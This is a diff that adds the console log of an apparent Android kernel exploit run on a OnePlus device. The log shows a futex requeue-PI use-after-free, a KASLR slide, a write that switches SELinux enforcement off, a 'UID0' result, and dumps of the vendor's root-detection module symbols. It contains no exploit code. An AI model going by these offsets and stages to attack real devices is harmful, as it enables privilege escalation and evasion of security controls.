@@ -1,0 +1,365 @@
+[33m[*] [0mpin core = 7 (CORE_SEL)
+[33m[*] [0mkernel: 5.10.236-android12-9-o-g74d132f4467a
+[32m[+] [0moffsets matched: 5.10.236-android12-9-o-g74d132f4467a
+[33m[*] [0minit_cred image=ffffffc00a7e0be0 alias=ffffff802a7e0be0
+[32m[+] [0mstartup context pid=23158 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=23158 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=23158 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=23158 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
+[33m[*] [0mkaslr_base=KIMAGE=ffffffc008000000 (perf skipped; USE_PERF_TEXT=1 to try)
+[33m[*] [0m[T+0ms] exploit start
+[32m[+] [0mWRITE_PROOF start SLIDE_ZERO data-only target=dataonly addr=ffffff802aa793c8 val=0000000000000000 boot_before=c5ad8ad0-9ef5-4c0e-a313-612d4e7821dd enforce_before=1
+[33m[*] [0mSTAGE write_proof_enter
+[33m[*] [0mslab_drain skipped (SKIP_DRAIN=1)
+[33m[*] [0m[T+33ms] pre-WRITE_PROOF drain
+[33m[*] [0m[T+33ms]   heap spray start
+[33m[*] [0mSTAGE spray_start
+[33m[*] [0mSLIDE/ZERO spray skipped: lock=init_task+0x878 ffffff802a7cc878 task=init_task_p0 ffffff802a7cc000
+[33m[*] [0m[T+35ms]   heap spray done
+[33m[*] [0mSTAGE spray_done_before_route_threads
+[33m[*] [0mSTAGE route_threads_create
+[33m[*] [0mowner blocking on f_pi_chain (deadlock stage for EDEADLK)
+[33m[*] [0mSTAGE before_cmp_requeue_pi
+[33m[*] [0mCMP_REQUEUE_PI ret=-1 errno=35 (EDEADLK/UAF-primed) — want EDEADLK(-35) for UAF
+[33m[*] [0mSTAGE after_cmp_requeue_pi
+[33m[*] [0mWAIT_REQUEUE_PI ret=-1 errno=110 (ETIMEDOUT)
+[33m[*] [0mSTAGE waiter_after_requeue_enter_pselect
+[33m[*] [0mstack mode4 SLIDE_ZERO PLAIN-STORE *state=ffffff802aa793c8 val=ffffff802abb0000 (enf=0 init≠0) lock=init_task+0x878
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 wps=5 page=ffffff802a7cc878 fake_lock=ffffff802a7cc878 fake_w0=0000000000000000 fake_task=ffffff802a7cc000
+[33m[*] [0mpselect place tree=ffffff802abb0000 pi=0000000000000000 task=ffffff802a7cc000 lock=ffffff802a7cc878 prio=0000000000000003 (expect task≈init/fake lock≈fake_lock)
+[33m[*] [0mpselect pre-select +2ms
+[33m[*] [0mconsumer punch tid=23162 sched_ret=0 errno=0
+[33m[*] [0mpselect post-select +1506ms ret=5
+[33m[*] [0mpselect returned attempt=1 ret=5 errno=0 calls=1 success=1 delay=50000 owner_unlock_done=0
+[33m[*] [0mpselect route probing cfi attempt=1 ret=5 expected=9
+[33m[*] [0mSWAP_NOCFI: skipping post-walk cfi probe fake_fops=ffffff802a7cc878
+[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
+[33m[*] [0mSTAGE waiter_pselect_returned
+[33m[*] [0mSTAGE route_done_observed
+[33m[*] [0mSTAGE route_threads_returned
+[33m[*] [0m[T+2598ms]   PI route done
+[32m[+] [0mWP_HOSTNAME=[localhost]
+[32m[+] [0mWRITE_PROOF done landed=1 boot_wrote=0 enf_wrote=1 boot_after=c5ad8ad0-9ef5-4c0e-a313-612d4e7821dd enforce_after=0 success_calls cfi_step=0 cfi_errno=0 cfi_wr=-1
+[33m[*] [0mSTAGE write_proof_LANDED
+[33m[*] [0mWRITE_PROOF POSITIVE store executes on-device — stopping (no W1). MODE4_ONLY implied.
+[32m[+] [0mUID0: park live — diag then cred if P0 task leak
+[33m[*] [0mSTAGE uid0_park_ok
+[33m[*] [0mDIAG enforce=0
+[33m[*] [0mDIAG kptr_restrict=2
+[33m[*] [0mDIAG kptr_wr_open fd=-1 errno=13
+[33m[*] [0mDIAG dmesg_restrict=0
+[33m[*] [0mDIAG perf_event_paranoid=-1
+[33m[*] [0mDIAG kallsyms_open fd=4 errno=0
+[33m[*] [0mDIAG kallsyms_head n=239 0000000000000000 T _text
+0000000000000000 t _head
+0000000000000000 t pe_header
+0
+[33m[*] [0mDIAG kpageflags fd=-1 errno=13
+[33m[*] [0mDIAG AF_PACKET fd=-1 errno=1
+[33m[*] [0mDIAG kmsg fd=-1 errno=13
+[33m[*] [0mDIAG syslog_read n=1916 errno=0
+[33m[*] [0mDIAG dmesg_tail =u:r:untrusted_app:s0:c149,c257,c512,c768 tcontext=u:object_r:unlabeled:s0 tclass=packet permissive=1 app=com.hdfcbank.payzapp
+<4>[  146.892923][T623162] process 23163 (gx693197935) no longer affine to cpu7
+<38>[  147.011715][T300993] type=
+[33m[*] [0mDIAG page_base=ffffff802a7cc878 fake_lock=ffffff802a7cc878 cred_copy=0000000000000000
+[33m[*] [0mUID0 harvest rootguard kallsyms
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.1	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.13	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.18	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.2	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.23	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.25	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.27	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.3	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.31	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.39	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 b $d.40	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 b $d.41	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.42	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.43	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.44	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.45	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.46	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.47	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.49	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.50	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.51	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.52	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.10	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.11	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.12	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.14	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.15	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.16	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.17	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.19	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.20	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.21	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.22	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.24	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.26	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.28	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.29	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.30	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.32	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.33	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.34	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.35	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.36	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.37	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.4	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.6	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.7	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.8	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.9	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r __kstrtab_oplus_RWO_root_check	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r __kstrtabns_oplus_RWO_root_check	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r __ksymtab_oplus_RWO_root_check	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d g_boot_state	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d oplus_post_hook_array	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d oplus_pre_hook_array	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_secure_harden_kevent	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.3	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.4	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r _note_7	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t cleanup_module	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_boot_state_init	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_get_pre_hook_num	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_get_post_hook_num	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_get_pre_hook	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_get_post_hook	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_boot_state_exit	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 w __cfi_check_fail	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t __cfi_check	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d __cfi_jt_init_module	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d __cfi_jt_cleanup_module	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 b p_tp_sys_enter	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 b p_tp_sys_exit	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_check_pre_handler	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_harden_pre_handler	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_exe_block_ret_handler	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_check_post_handler	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_check_succ	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_killed	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t is_unlocked	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 T oplus_RWO_root_check	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_harden_post_handler	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 d __this_module	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t __cfi_jt_start	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t __cfi_jt_end	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t init_module.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t cleanup_module.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_RWO_root_check.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_check_pre_handler.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_root_check_post_handler.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_exe_block_ret_handler.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 t oplus_harden_pre_handler.cfi_jt	[oplus_security_guard]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.1	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.17	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 b $d.18	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.19	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.2	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.20	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 b $d.21	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.22	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 d $d.23	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.3	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.10	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.11	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.12	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.13	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.14	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.4	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.5	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.6	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.8	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t $x.9	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r __kstrtab_kevent_send_to_user	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r __kstrtabns_kevent_send_to_user	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r __ksymtab_kevent_send_to_user	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 b kevent_pid	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 d oplus_security_family	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 b oplus_security_keventupload_flag	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r oplus_security_ops	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 t security_keventupload_sendpid_cmd	[oplus_security_keventupload]
+[33m[*] [0mUID0 SYM 0000000000000000 r $d.3	[oplus_security_keventupload]
+[33m[*] [0mUID0 MOD oplus_chg_symbol 16384 2 leds_qti_flash,fsa4480_i2c, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_chg 3866624 1 oplus_chg_symbol, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_chg_v2 4513792 1 oplus_chg_symbol, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_dump_tasks_mm 102400 0 [permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_connectivity_routerboost 16384 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_patch 28672 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_security_guard 24576 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_secure_common 28672 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_atd 20287488 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_vnet 28672 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_stability_helper 16384 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_score 65536 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_tp_gt9966 118784 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_ipa_thermal 45056 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_tp_tcm_S3910 139264 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_secure_harden 16384 1 oplus_security_guard, Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_tp_ft3658u 90112 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_vip_task 32768 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_qr_scan 20480 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_wificapcenter 16384 1 qca6490, Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_gloom 36864 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_network_linkpower_module 446464 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_networks_tuning 49152 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_wifismartantenna 16384 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_task_load 28672 0 [permanent], Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_connectivity_sla 24576 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_stats_calc 16384 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_app_monitor 45056 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_data_module 1011712 4 oplus_score,oplus_vip_task,oplus_network_linkpower_module,oplus_networks_tuning, Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_hans 32768 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_game_first 16384 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_security_keventupload 20480 2 oplus_security_guard,oplus_secure_harden, Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD horae_shell_temp 20480 1 oplus_ipa_thermal, Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_tp_tcm_oncell 126976 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_memleak_detect 81920 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_task_cpustats 1769472 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD dwc3_msm 163840 6 msm_drm,oplus_chg,oplus_chg_v2,usb_f_gsi,usb_f_qdss, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_dns_hook 24576 0 - Live 0x0000000000000000 (O)
+[33m[*] [0mUID0 MOD oplus_bsp_tp_syna_comnon 40960 2 oplus_bsp_tp_tcm_S3910,oplus_bsp_tp_tcm_oncell, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tp_focal_common 40960 1 oplus_bsp_tp_ft3658u, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_fp_common 28672 1 gf_qcom, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tp_goodix_comnon 28672 1 oplus_bsp_tp_gt9966, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD msm_kgsl 1953792 27 oplus_bsp_dump_tasks_mm,msm_sysstats, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_gpio 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tp_comon 397312 7 oplus_bsp_tp_gt9966,oplus_bsp_tp_tcm_S3910,oplus_bsp_tp_ft3658u,oplus_bsp_tp_tcm_oncell,oplus_bsp_tp_focal_common,oplus_bsp_tp_syna_comnon,oplus_bsp_tp_goodix_comnon, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_binder_strategy 163840 0 [permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD gh_mem_notifier 16384 2 msm_drm,oplus_bsp_tp_comon, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD gh_irq_lend 20480 2 msm_drm,oplus_bsp_tp_comon, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_rfcablemonitor 24576 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD pmic_glink 28672 7 oplus_chg,oplus_chg_v2,qti_battery_debug,spmi_glink_debug,altmode_glink,charger_ulog_glink,ucsi_glink, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_ist_up 24576 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tp_custom 20480 6 oplus_bsp_tp_tcm_S3910,oplus_bsp_tp_gt9966,oplus_bsp_tp_ft3658u,synaptics_tcm2,oplus_bsp_tp_tcm_oncell,oplus_bsp_tp_comon, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD ufcs_class 139264 1 oplus_chg_v2, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_mxm_down 32768 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD i2c_msm_geni 53248 1 oplus_chg_v2, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_ist_down 24576 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_kookong_ir_spi 20480 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_mxm_up 32768 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oem_qmi_client 20480 2 oplus_gpio,sim_detect, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tp_notify 16384 5 msm_drm,synaptics_tcm2,oplus_fp_common,oplus_bsp_tp_comon,uff_fp_driver, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD tcpc_class 401408 2 fsa4480_i2c,oplus_chg_v2, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_uxmem_opt 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD rproc_qcom_common 45056 18 oplus_chg,oplus_chg_v2,ipam,q6_notifier_dlkm,qcom_q6v5_pas,frpc_adsprpc,spss_utils,glink_probe,icnss2,qcom_spss,qcom_q6v5,slim_qcom_ngd_ctrl,pmic_glink,microdump_collector,qcom_sysmon,qsee_ipc_irq_bridge,pdr_interface,pci_msm_drv, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_sensor 57344 0 [permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_tri_key 45056 4 oplus_bsp_ist_up,oplus_bsp_mxm_down,oplus_bsp_ist_down,oplus_bsp_mxm_up, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_fw_update 16384 4 oplus_chg,oplus_chg_v2,synaptics_tcm2,oplus_bsp_tp_comon, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_hybridswap_zram 409600 1 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_sensor_feedback 36864 1 ssc_interact,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD olc 28672 6 camera,oplus_chg,oplus_chg_v2,synaptics_tcm2,oplus_bsp_tp_comon,uff_fp_driver, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_nfc 16384 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_ir_core 28672 1 oplus_bsp_kookong_ir_spi, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_theia 73728 19 msm_drm,hung_task_enhance,combkey_monitor, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_fdleak_check 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD qmi_helpers 28672 17 ipam,rmnet_core,oplus_network_linkpower_module,cnss2,coresight_remote_etm,snd_usb_audio_qmi,icnss2,msm_memshare,slim_qcom_ngd_ctrl,qti_qmi_cdev,cnss_plat_ipc_qmi_svc,qti_qmi_sensor_v2,wlan_firmware_service,qcom_sysmon,oem_qmi_client,heap_mem_ext_v01,pdr_interface, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_dynamic_readahead 16384 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_dfr_ubt 20480 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD test_kit 32768 2 oplus_chg,oplus_chg_v2, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_zsmalloc 81920 1 oplus_bsp_hybridswap_zram, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_mm_kevent_fb 28672 14 msm_drm,machine_dlkm,wcd937x_dlkm,wcd938x_dlkm,mbhc_dlkm,fsa4480_i2c,tfa98xx_v6_dlkm,adsp_loader_dlkm,swr_ctrl_dlkm,audio_prm_dlkm,audio_pkt_dlkm,gpr_dlkm,msm_kgsl,qcom_q6v5, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_mm_kevent 20480 1 oplus_mm_kevent_fb, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_kswapd_opt 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD panel_event_notifier 16384 11 msm_drm,oplus_chg,oplus_chg_v2,gf_qcom,synaptics_tcm2,ssc_interact,oplus_bsp_tp_comon,qti_amoled_ecm,uff_fp_driver,oplus_bsp_hybridswap_zram,oplus_theia, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_proactive_compact 24576 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_pcppages_opt 16384 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_kshrink_lruvecd 24576 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_abort_mm_opt 16384 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_sigkill_diagnosis 16384 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_mapped_protect 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_zram_opt 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_schedinfo 294912 3 oplus_bsp_gloom,oplus_bsp_hybridswap_zram,oplus_bsp_dynamic_readahead, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_locking_strategy 73728 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_uprobe 49152 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_storage_log 20480 1 oplus_uprobe, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_procs_load 16384 0 [permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_subsys_sleep_monitor 28672 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_mdmrst 24576 1 qcom_q6v5, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_qos_sched 36864 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_mdmfeature 36864 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_midas 921600 2 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD kernel_fb 28672 6 camera,oplus_chg,oplus_chg_v2,qcom_q6v5,haptic_feedback,oplus_bsp_sensor_feedback, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_saupwk 16384 0 [permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD saupwk 16384 1 oplus_saupwk, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_pmicwd 53248 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD qpnp_power_on 45056 2 qcom_esoc,oplus_pmicwd, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_kmsg_wb 20480 0 - Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_phoenix 36864 1 oplus_kmsg_wb,[permanent], Live 0x0000000000000000
